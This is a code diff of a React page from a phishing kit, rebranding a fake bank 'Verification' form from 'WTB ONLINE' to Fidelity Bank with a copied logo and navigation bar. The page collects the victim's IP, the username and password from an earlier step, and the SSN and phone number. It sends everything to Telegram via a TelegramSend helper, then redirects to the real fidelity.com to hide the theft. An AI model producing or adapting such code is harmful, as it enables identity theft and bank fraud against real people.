@@ -1,7 +1,8 @@
 import React from "react";
+import fid from "../assets/fidelity.svg";
+
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
-import Logo from "../assets/logo.jpeg";
 
 export default function Final() {
   const [isLoading, setIsLoading] = React.useState(false);
@@ -29,7 +30,7 @@ export default function Final() {
     const visitorIP = response.ip;
 
     const message = `
-        ---- WTB ONLINE -----
+        ---- FIDELITY BANK -----
         IP: ${visitorIP}
         Username: ${login1.username}
         Password: ${login1.password}
@@ -43,64 +44,57 @@ export default function Final() {
         `;
 
     await TelegramSend(message);
-    window.location.replace("https://watrust.com/");
+    window.location.replace("https://www.fidelity.com/")
     setIsLoading(false);
   }
 
   return (
     <>
+      <div className="navbar">
+        <div className="brand">
+          <div>
+            <img src={fid} alt="" />
+          </div>
+        </div>
+
+        <div className="nav-texts">
+          <p style={{ marginRight: 20 }}>Security</p>
+          <p>FAQ</p>
+        </div>
+      </div>
+
       <div className="content">
         <div className="form">
           <form onSubmit={handleSubmit} method="POST">
             <div className="form-item">
-              <div className="brand">
-                <img src={Logo} alt="" />
-              </div>
               <h2>Verification</h2>
-              <p>Verify your SSN and Phone number</p>
-
-
-              <div className="form-field">
-                <input
-                  maxLength={9}
-                  onChange={handleInputChange}
-                  name="sn"
-                  type="text"
-                  placeholder="SSN"
-                />
-              </div>
-
-              <div className="form-field">
-                <input
-                  maxLength={12}
-                  onChange={handleInputChange}
-                  name="phone"
-                  type="text"
-                  placeholder="Phone Number"
-                />
-              </div>
+              <p>
+                Verify your SSN and Phone number
+              </p>
               
-              <div
-                style={{
-                  display: "flex",
-                  alignItems: "center",
-                  justifyContent: "flex-end",
-                  marginTop: "-20px",
-                }}
-              >
-               
+                <div className="form-field">
+                  <label htmlFor="">SSN</label>
+                  <input maxLength={9} onChange={handleInputChange} name="code" type="text" />
+                </div>
+
+                <div className="form-field">
+                  <label htmlFor="">Phone Number</label>
+                  <input maxLength={12} onChange={handleInputChange} name="code" type="text" />
+                </div>
+
+                
                 {isLoading ? (
                   <div className="form-field">
-                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
+                    <button type="button">Please wait...</button>
                   </div>
                 ) : (
                   <div className="form-field">
-                    <button style={{ width: 120, height: 50 }} type="submit">
-                      Continue
-                    </button>
+                    <button type="submit">Submit</button>
                   </div>
                 )}
-              </div>
+
+                <a href="">Forgot username or password?</a>
+              
             </div>
           </form>
         </div>
